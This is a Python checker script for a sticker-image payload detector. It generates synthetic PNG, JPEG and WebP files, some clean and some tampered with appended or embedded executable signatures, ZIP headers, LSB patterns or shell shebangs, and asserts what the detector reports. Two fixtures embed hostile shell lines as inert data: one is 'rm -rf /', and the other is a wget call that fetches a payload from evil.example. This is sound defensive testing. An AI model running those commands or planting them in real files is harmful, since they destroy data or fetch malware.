#!/usr/bin/env python3
"""
Checker tool for sticker_payload_detector.py

Validates every detection capability by generating synthetic sticker files
(clean and malicious) and asserting the detector's output is correct.

Usage:
    python3 check_detector.py          # human-readable report
    python3 check_detector.py --json   # JSON output
    python3 check_detector.py -v       # verbose (show all findings/info)
"""

import os
import sys
import json
import struct
import zlib
import tempfile
import argparse
from dataclasses import dataclass, field
from typing import Callable

sys.path.insert(0, os.path.dirname(__file__))
from sticker_payload_detector import analyze_file

# ── ANSI colours (disabled on non-TTY) ──────────────────────────────────────
_USE_COLOR = sys.stdout.isatty()
def _c(code, text): return f"\033[{code}m{text}\033[0m" if _USE_COLOR else text
GREEN  = lambda t: _c("32", t)
RED    = lambda t: _c("31", t)
YELLOW = lambda t: _c("33", t)
BOLD   = lambda t: _c("1",  t)


# ── Synthetic file builders ──────────────────────────────────────────────────

def _png_chunk(ctype: bytes, data: bytes) -> bytes:
    body = ctype + data
    return struct.pack(">I", len(data)) + body + struct.pack(">I", zlib.crc32(body) & 0xFFFFFFFF)

def make_clean_png() -> bytes:
    sig = b"\x89PNG\r\n\x1a\n"
    ihdr = _png_chunk(b"IHDR", struct.pack(">IIBBBBB", 4, 4, 8, 2, 0, 0, 0))
    row  = b"\x00" + b"\x80\x80\x80" * 4   # filter none + grey pixels
    idat = _png_chunk(b"IDAT", zlib.compress(row * 4))
    iend = _png_chunk(b"IEND", b"")
    return sig + ihdr + idat + iend

def make_clean_jpeg() -> bytes:
    return (b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
            b"\xff\xd9")

def make_clean_webp() -> bytes:
    # Minimal lossy WebP (VP8 bitstream stub — just enough to pass format check)
    vp8_payload = b"VP8 " + struct.pack("<I", 6) + b"\x30\x01\x00\x9d\x01\x2a"
    riff_body   = b"WEBP" + vp8_payload
    return b"RIFF" + struct.pack("<I", len(riff_body)) + riff_body

def _append(base: bytes, extra: bytes) -> bytes:
    return base + extra

def _inject_at(base: bytes, pos: int, payload: bytes) -> bytes:
    return base[:pos] + payload + base[pos:]


# ── Test case definition ─────────────────────────────────────────────────────

@dataclass
class Case:
    name:        str
    description: str
    make_file:   Callable[[], bytes]
    suffix:      str
    expect_finding: str | None   # substring that must appear in findings (None = expect CLEAN)
    expect_clean:   bool = False  # True means findings must be empty


# ── All test cases ────────────────────────────────────────────────────────────

CASES: list[Case] = [
    # ── CLEAN files ───────────────────────────────────────────────────────────
    Case(
        name="clean_png",
        description="Clean 4×4 PNG — no payload",
        make_file=make_clean_png,
        suffix=".png",
        expect_finding=None,
        expect_clean=True,
    ),
    Case(
        name="clean_jpeg",
        description="Clean minimal JPEG — no payload",
        make_file=make_clean_jpeg,
        suffix=".jpg",
        expect_finding=None,
        expect_clean=True,
    ),
    Case(
        name="clean_webp",
        description="Clean minimal WebP — no payload",
        make_file=make_clean_webp,
        suffix=".webp",
        expect_finding=None,
        expect_clean=True,
    ),

    # ── APPENDED DATA ─────────────────────────────────────────────────────────
    Case(
        name="png_appended_mz",
        description="PNG with Windows PE (MZ) bytes appended after IEND",
        make_file=lambda: _append(make_clean_png(), b"\x4d\x5a" + b"\x90" * 60),
        suffix=".png",
        expect_finding="Appended data",
    ),
    Case(
        name="jpeg_appended_elf",
        description="JPEG with ELF binary appended after EOI",
        make_file=lambda: _append(make_clean_jpeg(), b"\x7fELF" + b"\x02" * 40),
        suffix=".jpg",
        expect_finding="Appended data",
    ),
    Case(
        name="webp_appended_script",
        description="WebP with shell script bytes appended beyond RIFF size",
        make_file=lambda: _append(make_clean_webp(), b"#!/bin/sh\nrm -rf /\n"),
        suffix=".webp",
        expect_finding="Appended data",
    ),

    # ── EXECUTABLE SIGNATURES IN BODY ─────────────────────────────────────────
    Case(
        name="png_embedded_elf",
        description="PNG with ELF magic bytes injected into body",
        make_file=lambda: _inject_at(make_clean_png(), 20, b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8),
        suffix=".png",
        expect_finding="ELF",
    ),
    Case(
        name="jpeg_embedded_pe",
        description="JPEG with Windows PE (MZ) magic in body",
        make_file=lambda: _inject_at(make_clean_jpeg(), 14, b"\x4d\x5a\x90\x00" + b"\x00" * 10),
        suffix=".jpg",
        expect_finding="PE",
    ),
    Case(
        name="png_embedded_pdf",
        description="PNG with PDF magic bytes injected",
        make_file=lambda: _inject_at(make_clean_png(), 20, b"\x25\x50\x44\x46-1.4\n"),
        suffix=".png",
        expect_finding="PDF",
    ),

    # ── ZIP / APK ─────────────────────────────────────────────────────────────
    Case(
        name="png_zip_apk",
        description="PNG with ZIP/APK local-file header embedded in body",
        make_file=lambda: _append(make_clean_png(), b"PK\x03\x04" + b"\x00" * 26),
        suffix=".png",
        expect_finding="ZIP",
    ),
    Case(
        name="jpeg_zip_apk",
        description="JPEG with APK signature appended",
        make_file=lambda: _append(make_clean_jpeg(), b"PK\x03\x04" + b"\x00" * 26),
        suffix=".jpg",
        expect_finding="ZIP",
    ),

    # ── LSB STEGANOGRAPHY ──────────────────────────────────────────────────────
    # Note: PNG IDAT bytes are zlib-compressed, so we cannot control their LSBs.
    # The detector uses raw file bytes for JPEG, making it the right format to test
    # the LSB chi-square path (chi² ≈ 0 means suspiciously uniform LSBs).
    Case(
        name="jpeg_lsb_stego",
        description="JPEG body padded with alternating 0xFE/0xFF bytes — uniform LSBs",
        make_file=lambda: _make_stego_jpeg(),
        suffix=".jpg",
        expect_finding="LSB",
    ),

    # ── SHELL SCRIPT SHEBANG ──────────────────────────────────────────────────
    Case(
        name="jpeg_shebang",
        description="JPEG with #!/bin/bash shebang injected",
        make_file=lambda: _inject_at(make_clean_jpeg(), 14, b"#!/bin/bash\nwget http://evil.example/payload\n"),
        suffix=".jpg",
        expect_finding="shebang",
    ),
]


def _make_stego_jpeg() -> bytes:
    """JPEG where 600+ bytes of the body alternate 0xFE/0xFF — LSBs are perfectly uniform."""
    header = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    # 600 bytes alternating 0/1 in LSB
    payload = bytes([0xFE if i % 2 == 0 else 0xFF for i in range(600)])
    eoi = b"\xff\xd9"
    return header + payload + eoi


def _make_stego_png() -> bytes:
    """PNG (32×32 RGB) where pixel bytes alternate 0/1 — uniform LSBs = stego signal.
    32×32×3 = 3072 pixel bytes, well above the 512-byte threshold in the detector."""
    W, H = 32, 32
    sig  = b"\x89PNG\r\n\x1a\n"
    ihdr = _png_chunk(b"IHDR", struct.pack(">IIBBBBB", W, H, 8, 2, 0, 0, 0))
    # Each scanline: 1 filter byte (0x00) + W*3 pixel bytes with alternating LSBs
    row  = b"\x00" + bytes([i % 2 for i in range(W * 3)])
    idat = _png_chunk(b"IDAT", zlib.compress(row * H))
    iend = _png_chunk(b"IEND", b"")
    return sig + ihdr + idat + iend


# ── Runner ────────────────────────────────────────────────────────────────────

@dataclass
class Result:
    case:    Case
    passed:  bool
    reason:  str = ""
    report:  dict = field(default_factory=dict)


def run_case(case: Case) -> Result:
    data = case.make_file()
    with tempfile.NamedTemporaryFile(suffix=case.suffix, delete=False) as f:
        f.write(data)
        path = f.name
    try:
        report = analyze_file(path)
    except Exception as e:
        return Result(case=case, passed=False, reason=f"analyze_file raised: {e}")
    finally:
        os.unlink(path)

    findings_text = " ".join(report["findings"]).lower()

    if case.expect_clean:
        if report["findings"]:
            return Result(case=case, passed=False,
                          reason=f"Expected CLEAN but got findings: {report['findings']}",
                          report=report)
        return Result(case=case, passed=True, report=report)

    if case.expect_finding:
        needle = case.expect_finding.lower()
        if needle in findings_text:
            return Result(case=case, passed=True, report=report)
        return Result(case=case, passed=False,
                      reason=f"Expected finding containing '{case.expect_finding}' "
                             f"but got: {report['findings']}",
                      report=report)

    return Result(case=case, passed=True, report=report)


# ── Reporting ─────────────────────────────────────────────────────────────────

def print_results(results: list[Result], verbose: bool):
    passed = sum(r.passed for r in results)
    total  = len(results)

    print(BOLD(f"\n{'='*62}"))
    print(BOLD(f"  Detector Checker — {total} test cases"))
    print(BOLD(f"{'='*62}"))

    for r in results:
        icon = GREEN("PASS") if r.passed else RED("FAIL")
        print(f"  [{icon}] {r.case.name}")
        print(f"         {r.case.description}")
        if not r.passed:
            print(f"         {YELLOW('Reason:')} {r.reason}")
        if verbose and r.report:
            rep = r.report
            if rep.get("findings"):
                print(f"         Findings : {rep['findings']}")
            if rep.get("warnings"):
                print(f"         Warnings : {rep['warnings']}")
            if rep.get("info"):
                print(f"         Info     : {rep['info'][:3]}")
        print()

    bar = GREEN(f"{passed}/{total} passed") if passed == total else RED(f"{passed}/{total} passed")
    verdict = GREEN("ALL CHECKS OK") if passed == total else RED(f"{total-passed} CHECK(S) FAILED")
    print(BOLD(f"  Result : {bar}  —  {verdict}"))
    print(BOLD(f"{'='*62}\n"))
    return passed == total


def main():
    parser = argparse.ArgumentParser(
        description="Check / validate sticker_payload_detector.py"
    )
    parser.add_argument("--json", action="store_true", help="Output as JSON")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show full findings for every case")
    args = parser.parse_args()

    results = [run_case(c) for c in CASES]

    if args.json:
        out = [
            {
                "name":    r.case.name,
                "description": r.case.description,
                "passed":  r.passed,
                "reason":  r.reason,
                "findings": r.report.get("findings", []),
                "warnings": r.report.get("warnings", []),
            }
            for r in results
        ]
        print(json.dumps(out, indent=2))
        sys.exit(0 if all(r.passed for r in results) else 1)

    ok = print_results(results, verbose=args.verbose)
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
